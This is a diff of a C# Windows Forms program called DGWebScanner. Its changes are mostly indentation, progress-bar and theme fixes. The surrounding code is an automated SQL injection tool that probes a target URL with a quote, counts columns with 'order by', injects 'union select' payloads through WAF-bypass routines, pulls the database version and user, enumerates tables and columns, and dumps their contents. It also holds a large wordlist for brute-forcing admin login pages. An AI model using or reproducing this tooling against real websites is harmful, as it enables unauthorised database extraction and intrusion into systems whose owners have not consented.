@@ -101,11 +101,11 @@ namespace DGWebScanner
                    });
                     try
                     {
-                       Debug.WriteLine("sdfsd    " + websiteURL.Text);
+                        Debug.WriteLine("sdfsd    " + websiteURL.Text);
                         string originalWebsiteHtml = client.DownloadString(websiteURL.Text);
                         try
                         {
-                           Debug.WriteLine(websiteURL.Text + "'");
+                            Debug.WriteLine(websiteURL.Text + "'");
                             SingleQuoteUrlBypass givenUrl = new SingleQuoteUrlBypass();
                             givenUrl.SetUrl(websiteURL.Text);
                             givenUrl.UpdateUrl();
@@ -152,7 +152,7 @@ namespace DGWebScanner
                                     n = n + 1;
                                     columnsWebsiteHtml =
                                         client.DownloadString(splitUrl[0] + "=-" + splitUrl[1] + "+order+by+" + n + "--");
-                                   Debug.WriteLine(splitUrl[0] + "=-" + splitUrl[1] + "+order+by+" + n + "--");
+                                    Debug.WriteLine(splitUrl[0] + "=-" + splitUrl[1] + "+order+by+" + n + "--");
                                     if (n > 50)
                                     {
                                         break;
@@ -202,12 +202,12 @@ namespace DGWebScanner
                                                                  columnNumbers + "--";
                                 string[] unionSelectResponse = WafBypassUnionSelect(wafBypassUnionSelectUrl);
                                 string vulnerableColumnsUrl = unionSelectResponse[0];
-                               Debug.WriteLine(vulnerableColumnsUrl);
+                                Debug.WriteLine(vulnerableColumnsUrl);
                                 unionSelectVersion = unionSelectResponse[1];
-                               Debug.WriteLine(unionSelectVersion);
+                                Debug.WriteLine(unionSelectVersion);
                                 string unionSelectNormalBypassNo = unionSelectResponse[2];
-                               Debug.WriteLine(unionSelectNormalBypassNo);
-                               Debug.WriteLine(columnNumbers);
+                                Debug.WriteLine(unionSelectNormalBypassNo);
+                                Debug.WriteLine(columnNumbers);
                                 if (unionSelectNormalBypassNo == "normal" || unionSelectNormalBypassNo == "bypass")
                                 {
                                     string correctColumnNumber = " ";
@@ -247,22 +247,22 @@ namespace DGWebScanner
                                                 StringSplitOptions.None);
                                         string firstSplitVulnerableColumnsUrl = splitVulnerableColumnsUrl[0];
                                         string secondSplitVulnerableColumnsUrl = splitVulnerableColumnsUrl[1];
-                                       Debug.WriteLine("SPLIT : " + firstSplitVulnerableColumnsUrl);
+                                        Debug.WriteLine("SPLIT : " + firstSplitVulnerableColumnsUrl);
                                         string[] numbersSplitVulnerableColumnsUrl =
                                             secondSplitVulnerableColumnsUrl.Split(',');
                                         numbersSplitVulnerableColumnsUrl[numbersSplitVulnerableColumnsUrl.Length - 1] =
                                             numbersSplitVulnerableColumnsUrl[numbersSplitVulnerableColumnsUrl.Length - 1
                                             ].TrimEnd('-');
-                                       Debug.WriteLine(
-                                            numbersSplitVulnerableColumnsUrl[numbersSplitVulnerableColumnsUrl.Length - 1
-                                            ]);
+                                        Debug.WriteLine(
+                                             numbersSplitVulnerableColumnsUrl[numbersSplitVulnerableColumnsUrl.Length - 1
+                                             ]);
                                         firstSplitVulnerableColumnsUrl = firstSplitVulnerableColumnsUrl +
                                                                          unionSelectVersion + "+";
                                         for (int i = 0; i < numbersSplitVulnerableColumnsUrl.Length; i++)
                                         {
                                             string currentVulnerableColumnsUrl = firstSplitVulnerableColumnsUrl +
                                                                                  numbersSplitVulnerableColumnsUrl[i];
-                                           Debug.WriteLine(currentVulnerableColumnsUrl + "--");
+                                            Debug.WriteLine(currentVulnerableColumnsUrl + "--");
                                             string currentVulnerableColumnsHtml =
                                                 client.DownloadString(currentVulnerableColumnsUrl + "--");
 
@@ -270,7 +270,7 @@ namespace DGWebScanner
                                                 currentVulnerableColumnsHtml.Contains(
                                                     numbersSplitVulnerableColumnsUrl[i]))
                                             {
-                                               Debug.WriteLine(numbersSplitVulnerableColumnsUrl[i]);
+                                                Debug.WriteLine(numbersSplitVulnerableColumnsUrl[i]);
                                                 vulnerableColumnsStatus.Invoke((MethodInvoker)delegate
                                                {
                                                    vulnerableColumnsStatus.Text = (i + 1).ToString();
@@ -302,7 +302,7 @@ namespace DGWebScanner
                                     {
                                         firstVulnerableColumn = vulnerableColumnsStatus.Text;
                                     }
-                                   Debug.WriteLine("firstVulnerableColumn : " + firstVulnerableColumn);
+                                    Debug.WriteLine("firstVulnerableColumn : " + firstVulnerableColumn);
                                     string userVersionUrl;
                                     if (newColumnNumbers != "")
                                     {
@@ -312,7 +312,7 @@ namespace DGWebScanner
                                         columnNumbers.Replace(
                                             (19970 + Convert.ToInt32(firstVulnerableColumn)).ToString(),
                                             "concat(2448,@@version,2448,user(),2448)");
-                                   Debug.WriteLine("userVersionColumns : " + userVersionColumns);
+                                    Debug.WriteLine("userVersionColumns : " + userVersionColumns);
                                     if (unionSelectNormalBypassNo == "normal")
                                     {
                                         userVersionUrl = splitUrl[0] + "=-" + splitUrl[1] + "+union+select+" +
@@ -327,7 +327,7 @@ namespace DGWebScanner
                                     string[] concatResponse = WafBypassConcat(userVersionUrl);
                                     userVersionUrl = concatResponse[0];
                                     concatVersion = concatResponse[1];
-                                   Debug.WriteLine(userVersionUrl);
+                                    Debug.WriteLine(userVersionUrl);
                                     string userVersionHtml = concatResponse[3];
                                     userVersionHtml = userVersionHtml.Replace("(2448,@@version,2448,user(),2448)",
                                         "DGWebScanner");
@@ -361,7 +361,7 @@ namespace DGWebScanner
                                     }
                                     else
                                     {
-                                       Debug.WriteLine("Version >=5");
+                                        Debug.WriteLine("Version >=5");
                                         //find Tablenames and Columns
                                         //Database then Table and then column
                                         //Database is 4559 to 3559
@@ -389,8 +389,8 @@ namespace DGWebScanner
 
                                         foundTableAndColumnNamesUrl = foundTableAndColumnNamesUrl.Replace(
                                             "union+select", unionSelectVersion);
-                                       Debug.WriteLine("foundTableAndColumnNames : ");
-                                       Debug.WriteLine(foundTableAndColumnNamesUrl);
+                                        Debug.WriteLine("foundTableAndColumnNames : ");
+                                        Debug.WriteLine(foundTableAndColumnNamesUrl);
                                         string foundTableAndColumnNamesHtml;
                                         try
                                         {
@@ -399,13 +399,13 @@ namespace DGWebScanner
                                         }
                                         catch (Exception ex)
                                         {
-                                           Debug.WriteLine(ex.Message);
+                                            Debug.WriteLine(ex.Message);
                                             statusInfo.Invoke((MethodInvoker)delegate
                                            {
                                                statusInfo.Text = "Website not loading. Attempting Bypass";
                                            });
-                                           Debug.WriteLine("foundTableAndColumnNamesURL : " +
-                                                              foundTableAndColumnNamesUrl);
+                                            Debug.WriteLine("foundTableAndColumnNamesURL : " +
+                                                               foundTableAndColumnNamesUrl);
                                             foundTableAndColumnNamesHtml =
                                                 client.DownloadString(foundTableAndColumnNamesUrl.Replace("where(1)",
                                                     "where(table_schema=database())"));
@@ -711,8 +711,8 @@ namespace DGWebScanner
                                                "+from+" + e.Node.Parent.Text + "--+";
                 //Console.WriteLine("Before databaseInfoTreeView -> foundColumnContentURL : " + Environment.NewLine + foundColumnContentURL);
                 // foundColumnContentURL = foundColumnContentURL.Replace("+union+select+", "+" + foundColumnContentVersion + "+");
-               Debug.WriteLine("databaseInfoTreeView -> foundColumnContentURL : " + Environment.NewLine +
-                                  foundColumnContentUrl);
+                Debug.WriteLine("databaseInfoTreeView -> foundColumnContentURL : " + Environment.NewLine +
+                                   foundColumnContentUrl);
 
                 string[] foundColumnContentResults = WafBypassDatabaseSearch(foundColumnContentUrl);
                 string foundColumnContentVersion = foundColumnContentResults[1];
@@ -798,6 +798,7 @@ namespace DGWebScanner
                     websiteURLAdmin.Text = websiteURLAdmin.Text.TrimEnd('/');
                 }
                 findAdminButton.Text = "Cancel Find";
+                maybeAdminURLListBox.Items.Clear();
                 findAdminPageWorker.RunWorkerAsync();
             }
         }
@@ -824,108 +825,109 @@ namespace DGWebScanner
 
         private readonly string[] adminUrls =
         {
-            "/account.asp", "/account.html", "/account.php", "/acct_login/", "/adm.asp", "/adm.html", "/adm.php",
-            "/adm/", "/adm/admloginuser.asp", "/adm/admloginuser.php", "/adm/index.asp", "/adm/index.html",
-            "/adm/index.php", "/adm_auth.asp", "/adm_auth.php", "/admin1.asp", "/admin1.html", "/admin1.php", "/admin1/",
-            "/admin2.asp", "/admin2.html", "/admin2.php", "/admin2/index.asp", "/admin2/index.php", "/admin2/login.asp",
-            "/admin2/login.php", "/admin4_account/", "/admin4_colon/", "/admin-login.asp", "/admin-login.html",
-            "/admin-login.php", "/admin.asp", "/admin.aspx", "/admin.html", "/admin.php", "/admin/",
-            "/admin/account.asp", "/admin/account.html", "/admin/account.php", "/admin/admin-login.asp",
-            "/admin/admin-login.html", "/admin/admin-login.php", "/admin/admin.asp", "/admin/admin.html",
-            "/admin/admin.php", "/admin/admin_login.asp", "/admin/admin_login.html", "/admin/admin_login.php",
-            "/admin/adminLogin.asp", "/admin/adminLogin.html", "/admin/adminLogin.php", "/admin/controlpanel.asp",
-            "/admin/controlpanel.html", "/admin/controlpanel.php", "/admin/cp.asp", "/admin/cp.html", "/admin/cp.php",
-            "/admin/home.asp", "/admin/home.html", "/admin/home.php", "/admin/index.asp", "/admin/index.html",
-            "/admin/index.php", "/admin/login.asp", "/admin/login.aspx", "/ADMIN/login.html", "/admin/login.html",
-            "/admin/login.php", "/admin_area/", "/admin_area/admin.asp", "/admin_area/admin.html",
-            "/admin_area/admin.php", "/admin_area/index.asp", "/admin_area/index.html", "/admin_area/index.php",
-            "/admin_area/login.asp", "/admin_area/login.html", "/admin_area/login.php", "/admin_login.asp",
-            "/admin_login.aspx", "/admin_login.html", "/admin_login.php", "/adminarea/", "/adminarea/admin.asp",
-            "/adminarea/admin.html", "/adminarea/admin.php", "/adminarea/index.asp", "/adminarea/index.html",
-            "/adminarea/index.php", "/adminarea/login.asp", "/adminarea/login.html", "/adminarea/login.php",
-            "/admincontrol.asp", "/admincontrol.html", "/admincontrol.php", "/admincontrol/login.asp",
-            "/admincontrol/login.html", "/admincontrol/login.php", "/admincp/index.asp", "/admincp/index.html",
-            "/admincp/login.asp", "/adminhome.asp", "/adminhome.aspx", "/administartorlogin.aspx", "/administer/",
-            "/administr8.asp", "/administr8.html", "/administr8.php", "/administr8/", "/administracion.php",
-            "/administrador/", "/administratie/", "/administration.html", "/administration.php", "/administration/",
-            "/administrator", "/administrator.asp", "/administrator.html", "/administrator.php", "/administrator/",
-            "/administrator/account.asp", "/administrator/account.html", "/administrator/account.php",
-            "/administrator/index.asp", "/administrator/index.html", "/administrator/index.php",
-            "/administrator/login.asp", "/administrator/login.html", "/administrator/login.php",
-            "/administrator_login.asp", "/administrator_login.aspx", "/administratoraccounts/",
-            "/administratorlogin.asp", "/administratorlogin.php", "/administratorlogin/", "/administrators/",
-            "/administrivia/", "/adminlogin.asp", "/adminLogin.html", "/adminLogin.php", "/adminLogin/",
-            "/adminpanel.asp", "/adminpanel.html", "/adminpanel.php", "/adminpro/", "/admins.asp", "/admins.html",
-            "/admins.php", "/admins/", "/AdminTools/", "/admloginuser.asp", "/admloginuser.php", "/admon/",
-            "/affiliate.asp", "/affiliate.php", "/autologin/", "/banneradmin/", "/bb-admin/", "/bb-admin/admin.asp",
-            "/bb-admin/admin.html", "/bb-admin/admin.php", "/bb-admin/index.asp", "/bb-admin/index.html",
-            "/bb-admin/index.php", "/bb-admin/login.asp", "/bb-admin/login.html", "/bb-admin/login.php", "/bbadmin/",
-            "/bigadmin/", "/blogindex/", "/cadmins/", "/ccms/", "/ccms/index.php", "/ccms/login.php", "/ccp14admin/",
-            "/cms/", "/cmsadmin/", "/configuration/", "/configure/", "/controlpanel.asp", "/controlpanel.html",
-            "/controlpanel.php", "/controlpanel/", "/cp.asp", "/cp.html", "/cp.php", "/cpanel/", "/cpanel_file/",
-            "/customer_login/", "/Database_Administration/", "/dir-login/", "/directadmin/", "/ezsqliteadmin/",
-            "/fileadmin.asp", "/fileadmin.html", "/fileadmin.php", "/fileadmin/", "/formslogin/", "/globes_admin/",
-            "/home.asp", "/home.html", "/home.php", "/hpwebjetadmin/", "/Indy_admin/", "/instadmin/", "/irc-macadmin/",
-            "/joomla/administrator", "/LiveUser_Admin/", "/login1/", "/login-redirect/", "/login-us/", "/login.asp",
-            "/login.html", "/login.php", "/login/", "/login/admin.asp", "/login/admin.aspx", "/login/asmindstrator.asp",
-            "/login_db/", "/loginflat/", "/logo_sysadmin/", "/Lotus_Domino_Admin/", "/macadmin/", "/maintenance/",
-            "/manuallogin/", "/memberadmin.asp", "/memberadmin.php", "/memberadmin/", "/members/", "/memlogin/",
-            "/meta_login/", "/modelsearch/admin.asp", "/modelsearch/admin.html", "/modelsearch/admin.php",
-            "/modelsearch/index.asp", "/modelsearch/index.html", "/modelsearch/index.php", "/modelsearch/login.asp",
-            "/modelsearch/login.html", "/modelsearch/login.php", "/moderator.asp", "/moderator.html", "/moderator.php",
-            "/moderator/", "/moderator/admin.asp", "/moderator/admin.html", "/moderator/admin.php",
-            "/moderator/login.asp", "/moderator/login.html", "/moderator/login.php", "/myadmin/", "/navSiteAdmin/",
-            "/newsadmin/", "/nsw/admin/login.php", "/openvpnadmin/", "/pages/admin/admin-login.asp",
-            "/pages/admin/admin-login.html", "/pages/admin/admin-login.php", "/panel-administracion/",
-            "/panel-administracion/admin.asp", "/panel-administracion/admin.html", "/panel-administracion/admin.php",
-            "/panel-administracion/index.asp", "/panel-administracion/index.html", "/panel-administracion/index.php",
-            "/panel-administracion/login.asp", "/panel-administracion/login.html", "/panel-administracion/login.php",
-            "/panel.php", "/panel/", "/panelc/", "/paneldecontrol/", "/pgadmin/", "/phpldapadmin/", "/phpmyadmin/",
-            "/phppgadmin/", "/phpSQLiteAdmin/", "/platz_login/", "/power_user/", "/project-admins/", "/pureadmin/",
-            "/radmind-1/", "/radmind/", "/rcjakar/admin/login.php", "/rcLogin/", "/Server.asp", "/Server.html",
-            "/Server.php", "/Server/", "/server_admin_small/", "/ServerAdministrator/", "/showlogin/", "/simpleLogin/",
-            "/siteadmin/index.asp", "/siteadmin/index.php", "/siteadmin/login.asp", "/siteadmin/login.html",
-            "/siteadmin/login.php", "/smblogin/", "/sql-admin/", "/ss_vms_admin_sm/", "/sshadmin/", "/staradmin/",
-            "/sub-login/", "/Super-Admin/", "/support_login/", "/sys-admin/", "/SysAdmin2/", "/sysadmin.asp",
-            "/sysadmin.html", "/sysadmin.php", "/sysadmin/", "/sysadmins/", "/system-administration/",
-            "/system_administration/", "/typo3/", "/ur-admin.asp", "/ur-admin.html", "/ur-admin.php", "/ur-admin/",
-            "/user.asp", "/user.html", "/user.php", "/useradmin/", "/UserLogin/", "/utility_login/", "/vadmind/",
-            "/vmailadmin/", "/webadmin.asp", "/webadmin.html", "/webadmin.php", "/webadmin/", "/webadmin/admin.asp",
-            "/webadmin/admin.html", "/webadmin/admin.php", "/webadmin/index.asp", "/webadmin/index.html",
-            "/webadmin/index.php", "/webadmin/login.asp", "/webadmin/login.html", "/webadmin/login.php", "/webmaster/",
-            "/websvn/", "/wizmysqladmin/", "/wp-admin/", "/wp-login.php", "/wp-login/", "/xlogin/", "/yonetici.asp",
-            "/yonetici.html", "/yonetici.php", "/yonetim.asp", "/yonetim.html", "/yonetim.php", "_admin/",
-            "a/dminlogin.aspx", "account.asp", "account.html", "adm.asp", "adm.html", "adm.php", "adm/",
-            "adm/admloginuser.asp", "adm/index.asp", "adm/index.html", "adm/index.php", "adm_auth.asp", "admin2.asp",
-            "admin2/index.asp", "admin2/login.asp", "admin-login.asp", "admin-login.html", "admin.asp", "admin.html",
-            "admin/", "admin/account.asp", "admin/account.html", "admin/admin-login.asp", "admin/admin-login.html",
-            "admin/admin.asp", "admin/admin.html", "admin/admin_login.asp", "admin/admin_login.html",
-            "admin/adminLogin.asp", "admin/adminLogin.html", "admin/controlpanel.asp", "admin/controlpanel.html",
-            "admin/cp.asp", "admin/cp.html", "admin/home.asp", "admin/home.html", "admin/index.asp", "admin/index.html",
-            "admin/login.asp", "admin/login.html", "admin_area/", "admin_area/admin.asp", "admin_area/admin.html",
-            "admin_area/index.asp", "admin_area/index.html", "admin_area/login.asp", "admin_area/login.html",
-            "admin_login.asp", "admin_login.html", "adminarea/", "adminarea/admin.asp", "adminarea/admin.html",
-            "adminarea/index.asp", "adminarea/index.html", "adminarea/login.asp", "adminarea/login.html",
-            "admincontrol.asp", "admincontrol.html", "admincontrol/login.asp", "admincontrol/login.html",
-            "admincp/index.asp", "admincp/index.html", "admincp/login.asp", "administrator.asp", "administrator.html",
-            "administrator/", "administrator/account.asp", "administrator/account.html", "administrator/index.asp",
-            "administrator/index.html", "administrator/login.asp", "administrator/login.html", "administratorlogin.asp",
-            "administratorlogin/", "adminLogin.asp", "adminLogin.html", "adminLogin/", "adminpanel.asp",
-            "adminpanel.html", "admloginuser.asp", "affiliate.asp", "affiliate.php", "backoffice/", "bb-admin/",
-            "bb-admin/admin.asp", "bb-admin/admin.html", "bb-admin/index.asp", "bb-admin/index.html",
-            "bb-admin/login.asp", "bb-admin/login.html", "controlpanel.asp", "controlpanel.html", "cp.asp", "cp.html",
-            "cp.php", "home.asp", "home.html", "instadmin/", "login.asp", "login.html", "login/administrator.aspx",
-            "memberadmin.asp", "memberadmin/", "modelsearch/admin.asp", "modelsearch/admin.html",
-            "modelsearch/index.asp", "modelsearch/index.html", "modelsearch/login.asp", "modelsearch/login.html",
-            "moderator.asp", "moderator.html", "moderator/", "moderator/admin.asp", "moderator/admin.html",
-            "moderator/login.asp", "moderator/login.html", "pages/admin/admin-login.asp", "pages/admin/admin-login.html",
-            "panel-administracion/", "panel-administracion/admin.asp", "panel-administracion/admin.html",
-            "panel-administracion/index.asp", "panel-administracion/index.html", "panel-administracion/login.asp",
-            "panel-administracion/login.html", "siteadmin/index.asp", "siteadmin/login.asp", "siteadmin/login.html",
-            "user.asp", "user.html", "webadmin.asp", "webadmin.html", "webadmin/", "webadmin/admin.asp",
-            "webadmin/admin.html", "webadmin/index.asp", "webadmin/index.html", "webadmin/login.asp",
-            "webadmin/login.html"
-        };
+              "/account.asp", "/account.html", "/account.php", "/acct_login/", "/adm.asp", "/adm.html", "/adm.php",
+              "/adm/", "/adm/admloginuser.asp", "/adm/admloginuser.php", "/adm/index.asp", "/adm/index.html",
+              "/adm/index.php", "/adm_auth.asp", "/adm_auth.php", "/admin1.asp", "/admin1.html", "/admin1.php", "/admin1/",
+              "/admin2.asp", "/admin2.html", "/admin2.php", "/admin2/index.asp", "/admin2/index.php", "/admin2/login.asp",
+              "/admin2/login.php", "/admin4_account/", "/admin4_colon/", "/admin-login.asp", "/admin-login.html",
+              "/admin-login.php", "/admin.asp", "/admin.aspx", "/admin.html", "/admin.php", "/admin/",
+              "/admin/account.asp", "/admin/account.html", "/admin/account.php", "/admin/admin-login.asp",
+              "/admin/admin-login.html", "/admin/admin-login.php", "/admin/admin.asp", "/admin/admin.html",
+              "/admin/admin.php", "/admin/admin_login.asp", "/admin/admin_login.html", "/admin/admin_login.php",
+              "/admin/adminLogin.asp", "/admin/adminLogin.html", "/admin/adminLogin.php", "/admin/controlpanel.asp",
+              "/admin/controlpanel.html", "/admin/controlpanel.php", "/admin/cp.asp", "/admin/cp.html", "/admin/cp.php",
+              "/admin/home.asp", "/admin/home.html", "/admin/home.php", "/admin/index.asp", "/admin/index.html",
+              "/admin/index.php", "/admin/login.asp", "/admin/login.aspx", "/ADMIN/login.html", "/admin/login.html",
+              "/admin/login.php", "/admin_area/", "/admin_area/admin.asp", "/admin_area/admin.html",
+              "/admin_area/admin.php", "/admin_area/index.asp", "/admin_area/index.html", "/admin_area/index.php",
+              "/admin_area/login.asp", "/admin_area/login.html", "/admin_area/login.php", "/admin_login.asp",
+              "/admin_login.aspx", "/admin_login.html", "/admin_login.php", "/adminarea/", "/adminarea/admin.asp",
+              "/adminarea/admin.html", "/adminarea/admin.php", "/adminarea/index.asp", "/adminarea/index.html",
+              "/adminarea/index.php", "/adminarea/login.asp", "/adminarea/login.html", "/adminarea/login.php",
+              "/admincontrol.asp", "/admincontrol.html", "/admincontrol.php", "/admincontrol/login.asp",
+              "/admincontrol/login.html", "/admincontrol/login.php", "/admincp/index.asp", "/admincp/index.html",
+              "/admincp/login.asp", "/adminhome.asp", "/adminhome.aspx", "/administartorlogin.aspx", "/administer/",
+              "/administr8.asp", "/administr8.html", "/administr8.php", "/administr8/", "/administracion.php",
+              "/administrador/", "/administratie/", "/administration.html", "/administration.php", "/administration/",
+              "/administrator", "/administrator.asp", "/administrator.html", "/administrator.php", "/administrator/",
+              "/administrator/account.asp", "/administrator/account.html", "/administrator/account.php",
+              "/administrator/index.asp", "/administrator/index.html", "/administrator/index.php",
+              "/administrator/login.asp", "/administrator/login.html", "/administrator/login.php",
+              "/administrator_login.asp", "/administrator_login.aspx", "/administratoraccounts/",
+              "/administratorlogin.asp", "/administratorlogin.php", "/administratorlogin/", "/administrators/",
+              "/administrivia/", "/adminlogin.asp", "/adminLogin.html", "/adminLogin.php", "/adminLogin/",
+              "/adminpanel.asp", "/adminpanel.html", "/adminpanel.php", "/adminpro/", "/admins.asp", "/admins.html",
+              "/admins.php", "/admins/", "/AdminTools/", "/admloginuser.asp", "/admloginuser.php", "/admon/",
+              "/affiliate.asp", "/affiliate.php", "/autologin/", "/banneradmin/", "/bb-admin/", "/bb-admin/admin.asp",
+              "/bb-admin/admin.html", "/bb-admin/admin.php", "/bb-admin/index.asp", "/bb-admin/index.html",
+              "/bb-admin/index.php", "/bb-admin/login.asp", "/bb-admin/login.html", "/bb-admin/login.php", "/bbadmin/",
+              "/bigadmin/", "/blogindex/", "/cadmins/", "/ccms/", "/ccms/index.php", "/ccms/login.php", "/ccp14admin/",
+              "/cms/", "/cmsadmin/", "/configuration/", "/configure/", "/controlpanel.asp", "/controlpanel.html",
+              "/controlpanel.php", "/controlpanel/", "/cp.asp", "/cp.html", "/cp.php", "/cpanel/", "/cpanel_file/",
+              "/customer_login/", "/Database_Administration/", "/dir-login/", "/directadmin/", "/ezsqliteadmin/",
+              "/fileadmin.asp", "/fileadmin.html", "/fileadmin.php", "/fileadmin/", "/formslogin/", "/globes_admin/",
+              "/home.asp", "/home.html", "/home.php", "/hpwebjetadmin/", "/Indy_admin/", "/instadmin/", "/irc-macadmin/",
+              "/joomla/administrator", "/LiveUser_Admin/", "/login1/", "/login-redirect/", "/login-us/", "/login.asp",
+              "/login.html", "/login.php", "/login/", "/login/admin.asp", "/login/admin.aspx", "/login/asmindstrator.asp",
+              "/login_db/", "/loginflat/", "/logo_sysadmin/", "/Lotus_Domino_Admin/", "/macadmin/", "/maintenance/",
+              "/manuallogin/", "/memberadmin.asp", "/memberadmin.php", "/memberadmin/", "/members/", "/memlogin/",
+              "/meta_login/", "/modelsearch/admin.asp", "/modelsearch/admin.html", "/modelsearch/admin.php",
+              "/modelsearch/index.asp", "/modelsearch/index.html", "/modelsearch/index.php", "/modelsearch/login.asp",
+              "/modelsearch/login.html", "/modelsearch/login.php", "/moderator.asp", "/moderator.html", "/moderator.php",
+              "/moderator/", "/moderator/admin.asp", "/moderator/admin.html", "/moderator/admin.php",
+              "/moderator/login.asp", "/moderator/login.html", "/moderator/login.php", "/myadmin/", "/navSiteAdmin/",
+              "/newsadmin/", "/nsw/admin/login.php", "/openvpnadmin/", "/pages/admin/admin-login.asp",
+              "/pages/admin/admin-login.html", "/pages/admin/admin-login.php", "/panel-administracion/",
+              "/panel-administracion/admin.asp", "/panel-administracion/admin.html", "/panel-administracion/admin.php",
+              "/panel-administracion/index.asp", "/panel-administracion/index.html", "/panel-administracion/index.php",
+              "/panel-administracion/login.asp", "/panel-administracion/login.html", "/panel-administracion/login.php",
+              "/panel.php", "/panel/", "/panelc/", "/paneldecontrol/", "/pgadmin/", "/phpldapadmin/", "/phpmyadmin/",
+              "/phppgadmin/", "/phpSQLiteAdmin/", "/platz_login/", "/power_user/", "/project-admins/", "/pureadmin/",
+              "/radmind-1/", "/radmind/", "/rcjakar/admin/login.php", "/rcLogin/", "/Server.asp", "/Server.html",
+              "/Server.php", "/Server/", "/server_admin_small/", "/ServerAdministrator/", "/showlogin/", "/simpleLogin/",
+              "/siteadmin/index.asp", "/siteadmin/index.php", "/siteadmin/login.asp", "/siteadmin/login.html",
+              "/siteadmin/login.php", "/smblogin/", "/sql-admin/", "/ss_vms_admin_sm/", "/sshadmin/", "/staradmin/",
+              "/sub-login/", "/Super-Admin/", "/support_login/", "/sys-admin/", "/SysAdmin2/", "/sysadmin.asp",
+              "/sysadmin.html", "/sysadmin.php", "/sysadmin/", "/sysadmins/", "/system-administration/",
+              "/system_administration/", "/typo3/", "/ur-admin.asp", "/ur-admin.html", "/ur-admin.php", "/ur-admin/",
+              "/user.asp", "/user.html", "/user.php", "/useradmin/", "/UserLogin/", "/utility_login/", "/vadmind/",
+              "/vmailadmin/", "/webadmin.asp", "/webadmin.html", "/webadmin.php", "/webadmin/", "/webadmin/admin.asp",
+              "/webadmin/admin.html", "/webadmin/admin.php", "/webadmin/index.asp", "/webadmin/index.html",
+              "/webadmin/index.php", "/webadmin/login.asp", "/webadmin/login.html", "/webadmin/login.php", "/webmaster/",
+              "/websvn/", "/wizmysqladmin/", "/wp-admin/", "/wp-login.php", "/wp-login/", "/xlogin/", "/yonetici.asp",
+              "/yonetici.html", "/yonetici.php", "/yonetim.asp", "/yonetim.html", "/yonetim.php", "_admin/",
+              "a/dminlogin.aspx", "account.asp", "account.html", "adm.asp", "adm.html", "adm.php", "adm/",
+              "adm/admloginuser.asp", "adm/index.asp", "adm/index.html", "adm/index.php", "adm_auth.asp", "admin2.asp",
+              "admin2/index.asp", "admin2/login.asp", "admin-login.asp", "admin-login.html", "admin.asp", "admin.html",
+              "admin/", "admin/account.asp", "admin/account.html", "admin/admin-login.asp", "admin/admin-login.html",
+              "admin/admin.asp", "admin/admin.html", "admin/admin_login.asp", "admin/admin_login.html",
+              "admin/adminLogin.asp", "admin/adminLogin.html", "admin/controlpanel.asp", "admin/controlpanel.html",
+              "admin/cp.asp", "admin/cp.html", "admin/home.asp", "admin/home.html", "admin/index.asp", "admin/index.html",
+              "admin/login.asp", "admin/login.html", "admin_area/", "admin_area/admin.asp", "admin_area/admin.html",
+              "admin_area/index.asp", "admin_area/index.html", "admin_area/login.asp", "admin_area/login.html",
+              "admin_login.asp", "admin_login.html", "adminarea/", "adminarea/admin.asp", "adminarea/admin.html",
+              "adminarea/index.asp", "adminarea/index.html", "adminarea/login.asp", "adminarea/login.html",
+              "admincontrol.asp", "admincontrol.html", "admincontrol/login.asp", "admincontrol/login.html",
+              "admincp/index.asp", "admincp/index.html", "admincp/login.asp", "administrator.asp", "administrator.html",
+              "administrator/", "administrator/account.asp", "administrator/account.html", "administrator/index.asp",
+              "administrator/index.html", "administrator/login.asp", "administrator/login.html", "administratorlogin.asp",
+              "administratorlogin/", "adminLogin.asp", "adminLogin.html", "adminLogin/", "adminpanel.asp",
+              "adminpanel.html", "admloginuser.asp", "affiliate.asp", "affiliate.php", "backoffice/", "bb-admin/",
+              "bb-admin/admin.asp", "bb-admin/admin.html", "bb-admin/index.asp", "bb-admin/index.html",
+              "bb-admin/login.asp", "bb-admin/login.html", "controlpanel.asp", "controlpanel.html", "cp.asp", "cp.html",
+              "cp.php", "home.asp", "home.html", "instadmin/", "login.asp", "login.html", "login/administrator.aspx",
+              "memberadmin.asp", "memberadmin/", "modelsearch/admin.asp", "modelsearch/admin.html",
+              "modelsearch/index.asp", "modelsearch/index.html", "modelsearch/login.asp", "modelsearch/login.html",
+              "moderator.asp", "moderator.html", "moderator/", "moderator/admin.asp", "moderator/admin.html",
+              "moderator/login.asp", "moderator/login.html", "pages/admin/admin-login.asp", "pages/admin/admin-login.html",
+              "panel-administracion/", "panel-administracion/admin.asp", "panel-administracion/admin.html",
+              "panel-administracion/index.asp", "panel-administracion/index.html", "panel-administracion/login.asp",
+              "panel-administracion/login.html", "siteadmin/index.asp", "siteadmin/login.asp", "siteadmin/login.html",
+              "user.asp", "user.html", "webadmin.asp", "webadmin.html", "webadmin/", "webadmin/admin.asp",
+              "webadmin/admin.html", "webadmin/index.asp", "webadmin/index.html", "webadmin/login.asp",
+              "webadmin/login.html"
+          };
+
 
         [SuppressMessage("ReSharper", "AccessToModifiedClosure")]
         private void findAdminPageWorker_DoWork(object sender, DoWorkEventArgs e)
@@ -938,7 +940,7 @@ namespace DGWebScanner
             {
                 statusInfo.Invoke((MethodInvoker)delegate
                {
-                   statusInfo.Text = "Finding Admin Page " + i + "/" + adminUrls.Count();
+                   statusInfo.Text = "Finding Admin Page " + (i + 1) + "/" + progressBar1.Maximum;
                    adminURLListBox.Invoke((MethodInvoker)delegate
                    {
                        adminURLListBox.SelectedIndex = i;
@@ -951,6 +953,7 @@ namespace DGWebScanner
                        i = adminUrls.Count() - 1;
                    }
                });
+                findAdminPageWorker.ReportProgress(i + 1);
                 if (proxyIP.Text != string.Empty && proxyPort.Text != string.Empty)
                 {
                     if (proxyUsername.Text != string.Empty && proxyPassword.Text != string.Empty)
@@ -994,8 +997,6 @@ namespace DGWebScanner
                        });
                     }
                 }
-
-                findAdminPageWorker.ReportProgress(i + 1);
             }
             statusInfo.Invoke((MethodInvoker)delegate
            {
@@ -1085,7 +1086,10 @@ namespace DGWebScanner
             }
             else
             {
-                MessageBox.Show("Process was completed!");
+                statusInfo.Invoke((MethodInvoker)delegate
+                {
+                    statusInfo.Text = "Process was completed!";
+                });
             }
             adminURLListBox.SelectionMode = SelectionMode.None;
             findAdminButton.Text = "Find Admin Page";
@@ -1178,11 +1182,20 @@ namespace DGWebScanner
             Settings.Default["accentColorSetting"] = accentColorComboBox.Text;
             if (lightCheckBox.Checked)
             {
+
                 Settings.Default["themeColorSetting"] = "LIGHT";
+                string colorString = accentColorComboBox.Text + "700";
+                Accent colorEnum;
+                Enum.TryParse(colorString, out colorEnum);
+                statusInfo.ForeColor = Color.FromArgb((int)colorEnum);
             }
             else if (darkCheckBox.Checked)
             {
